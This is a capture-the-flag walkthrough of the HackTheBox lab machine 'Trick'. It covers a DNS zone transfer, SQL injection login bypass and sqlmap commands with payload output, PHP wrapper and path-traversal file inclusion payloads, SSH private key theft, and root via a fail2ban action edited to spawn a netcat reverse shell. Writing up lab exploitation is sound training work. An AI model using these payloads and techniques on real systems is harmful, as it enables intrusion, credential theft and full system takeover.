---
created: 2025-09-08
---

📅 `2025-09-08`

#zone-transfer #sql-injection #lfi #ssh-key #sudo

----

## 🖥️ Box Info

| ️🏷️ Name         |  `Trick`   |
| --------------- | --- |
| 📆 Release Date |   `2022-06-18`  |
| 🌐 IP Address   |  `10.10.11.166`   |
| 🖥️ OS           |   `Linux`  |
| 🎯 Difficulty   |  `Easy`   |

----

## 🧠 Summary


**🧩 Key Concepts:** 

- `DNS` zone transfer
- `SQL` injection
- Subdomain finding by including `nginx` config file through `LFI`
- Include `SSH` key

**🛠️ Tools:**  

- `dig`
- `sqlmap`

**📚 Learned:**  

- Assume the domain name if it's not given to us.
- Even if `SQL` injection only seems to give an authentication bypass, use `sqlmap` to go further.
- Always enumerate the database user's privileges with `sqlmap`'s `--privileges` flag.
- Always include the web server's config file and continue enumerating. Look for more subdomains.
- There were a lot of rabbit holes in this machine. The passwords found were not used for anything.
- Always try to include the user's `SSH` key.

----

## 🌐 Port Scan

- **TCP**: 22, 25, 53, 80
- **UDP**: —

---

## 🔍 Enumeration

`SMTP` and `DNS` are unusual here. As always, I started with the web service. This was the page:

![[Pasted image 20250907222138.png]]

There was nothing interesting, and testing the input field found nothing, so I focused on the other ports. I assumed the domain was `trick.htb`, following the usual `HackTheBox` naming pattern. I added that to `/etc/hosts` and then tried a zone transfer for that domain.

```shell
$ dig axfr trick.htb @10.10.11.166

; <<>> DiG 9.20.11-4+b1-Debian <<>> axfr trick.htb @10.10.11.166
;; global options: +cmd
trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.		604800	IN	NS	trick.htb.
trick.htb.		604800	IN	A	127.0.0.1
trick.htb.		604800	IN	AAAA	::1
preprod-payroll.trick.htb. 604800 IN	CNAME	trick.htb.
trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 111 msec
;; SERVER: 10.10.11.166#53(10.10.11.166) (TCP)
;; WHEN: Sun Sep 07 22:20:02 -05 2025
;; XFR size: 6 records (messages 1, bytes 231)
```

The zone transfer revealed the subdomain `preprod-payroll.trick.htb`, which I added to `/etc/hosts`.

This is the page:

![[Pasted image 20250907222926.png]]

It's a login panel. Let's try some injections.

---

## 🪜 Foothold

I just typed `OR 1=1-- -` in both the username and password fields and got this:

![[Pasted image 20250907223049.png]]

Successfully bypassed login via `SQL` injection.

I investigated the site for some time and the parameter `?page` caught my attention.

![[Pasted image 20250907224537.png]]

It looked like a candidate for `LFI`. I tried lots of payloads and bypasses but nothing was working. Based on the `page` values, I suspected two things: the app restricts us to the current folder of the web directory, and it appends a `.php` extension to the value. Appending a `NULL` byte (`%00`) didn't work either. I decided to try the `PHP` `base64` wrapper.

- `?page=php://filter/convert.base64-encode/resource=index`

![[Pasted image 20250907224823.png]]

And it worked!

>[!note]
>The wrapper works with `index` and not `index.php` because the app appends `.php` itself.

I decoded it, piped it to `less` (`batcat`), and found these lines:

```php
<?php $page = isset($_GET['page']) ? $_GET['page'] :'home'; ?>
<?php include $page.'.php' ?>
```

It could include files from anywhere, but it appended the `php` extension to the file names. I kept looking for interesting files.

Trying `home`, I found this:

![[Pasted image 20250907225201.png]]

The first line references `db_connect.php`, which should contain database credentials. I fetched it next.

![[Pasted image 20250907225431.png]]

![[Pasted image 20250907225238.png]]

Credentials:

- `remo`:`TrulyImpossiblePasswordLmao123`

These credentials didn't work over `SSH`. Looking for users on the website, I found John Smith, but a `username-anarchy` wordlist built from his name didn't work either. Then I clicked the "edit" button on the "Administrator" user on the "users" page and found this:

![[Pasted image 20250907231111.png]]

Removing `type="password"` from the `HTML` revealed the password. Found another pair of credentials:

- `Enemigosss`:`SuperGucciRainbowCake`

These credentials didn't lead anywhere either, including over `SSH`. I decided to leverage the `SQL` injection and enumerate the database a little more. I already knew that a working payload is `' OR 1=1-- -`, so it's boolean-based blind `SQLi`. I just had to adapt the command to make it work.

This command gave me a time-based blind `SQL` injection, which was not what I was looking for. It also told me the `DBMS` was `MySQL`.

```shell
sqlmap -r req.txt --batch -p 'username'
```

I tried this command next.

```shell
sqlmap -r req.txt --batch -p 'username' --technique 'BEUSQ' --dbms mysql
```

But it didn't work, so I tried incrementing the level and risk:

```shell
sqlmap -r req.txt --batch -p 'username' --technique 'BEUSQ' --dbms mysql --level 3 --risk 3

sqlmap identified the following injection point(s) with a total of 390 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: username=admin' OR NOT 2233=2233-- esvZ&password=admin

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=admin' OR (SELECT 8986 FROM(SELECT COUNT(*),CONCAT(0x7178787671,(SELECT (ELT(8986=8986,1))),0x71716a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- UJXH&password=admin
---
```

And this time it worked! `sqlmap` found a boolean-based blind injection and an error-based injection, so I enumerated the database.

First, we have to see what user we are and what privileges it has.

```shell
sqlmap -r req.txt --batch -p 'username' --technique 'BEUSQ' --dbms mysql --level 3 --risk 3 --privileges

database management system users privileges:
[*] 'remo'@'localhost' [1]:
    privilege: FILE
```

We are user `remo`, which has `FILE` privileges, which means we can read and write files. Let's read `/etc/passwd`.

```shell
sqlmap -r req.txt --batch --file-read /etc/passwd
```

It saved the file to `~/.local/share/sqlmap/output/...`

```shell
cat /home/asdf/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd

<SNIP>
michael:x:1001:1001::/home/michael:/bin/bash
```

We got user `michael`.

I also checked where we are:

```shell
sqlmap -r req.txt --batch --file-read /var/www/payroll/payroll.php

[01:47:16] [INFO] fetching file: '/var/www/payroll/payroll.php'
3C3F70687020696E636C756465282764625F636F6E6E6563742E7068702729203F3E0D0A09093C64697620636C6173733D22636F6E7461696E65722D666C7569642022203E0D0A0909093C64697620636C6173733D22636F6C2D6C672D3132223E0D0A090909090D0A090909093C6272202F3E0D0A090909093C6272202F3E0D0A090909093C64697620636C6173733D2263617264223E0D0A09090909093C64697620636C6173733D22636172642D686561646572223E0D0A0909090909093C7370616E3E3C623E506179726F6C6C204C6973743C2F623E3C2F7370616E3E0D0A09090909...
```

The web app runs from `/var/www/payroll`. I tried writing a `PHP` web shell into that directory and including it with the earlier `LFI`, but it didn't work. Next, let's read the `nginx` config files. The config file is located at `/etc/nginx/nginx.conf` and the virtual hosts are at `/etc/nginx/sites-available/default`.

I found this entry:

![[Pasted image 20250908015221.png]]

I found this site:

![[Pasted image 20250908211556.png]]

Its buttons also lead to pages with the pattern `?page=<page>`.

![[Pasted image 20250908211617.png]]

I tried some `LFI` payloads and found that `....//....//` worked. This time the extension was not appended and we had read permissions on `/home/michael`. I tried reading his `SSH` key and got it.

![[Pasted image 20250908211657.png]]

I used it to `SSH` into the machine.

```shell
ssh michael@trick.htb -i id_rsa
Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64

michael@trick:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
```

Got user.

---

## 🛡️ Privilege Escalation

`sudo -l` showed our user can run `sudo /usr/bin/fail2ban restart`. Looking up privilege escalation vectors for `fail2ban`, I found we can modify the actions file, located in `/etc/fail2ban/action.d/iptables-multiport.conf`.

```shell
michael@trick:/tmp$ sudo -l
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```

This is the syntax of the file:

```
<SNIP>
actionstart = <iptables> -N f2b-<name>
              <iptables> -A f2b-<name> -j <returntype>
              <iptables> -I <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>

# Option:  actionstop
# Notes.:  command executed once at the end of Fail2Ban
# Values:  CMD
#
actionstop = <iptables> -D <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>
             <actionflush>
             <iptables> -X f2b-<name>

# Option:  actioncheck
# Notes.:  command executed once before each actionban command
# Values:  CMD
#
actioncheck = <iptables> -n -L <chain> | grep -q 'f2b-<name>[ \t]'

# Option:  actionban
# Notes.:  command executed when banning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
<SNIP>
```

We can just replace some of these actions with a `netcat` reverse shell (`nc` is installed on the target). Using `actionstart` and restarting the service didn't work. Using `actionban` worked: I triggered a ban by brute-forcing `SSH` with `hydra`.

>[!tip]
>Because of the file's permissions, I had to copy this file to `/tmp/`, edit it, and copy it back to `/etc/fail2ban/action.d/`.

```shell
listen linux 1234

[!] Fix command copied to clipboard:
    export TERM=xterm-256color; stty rows 42 cols 191; alias ls='ls --color=auto'; alias grep='grep --color=auto'; alias ip='ip --color=auto'

info: Listening on 0.0.0.0:1234
                               info: Connection Received
                                                        root@trick:/# 
														
root@trick:/# whoami
root
```

Rooted.
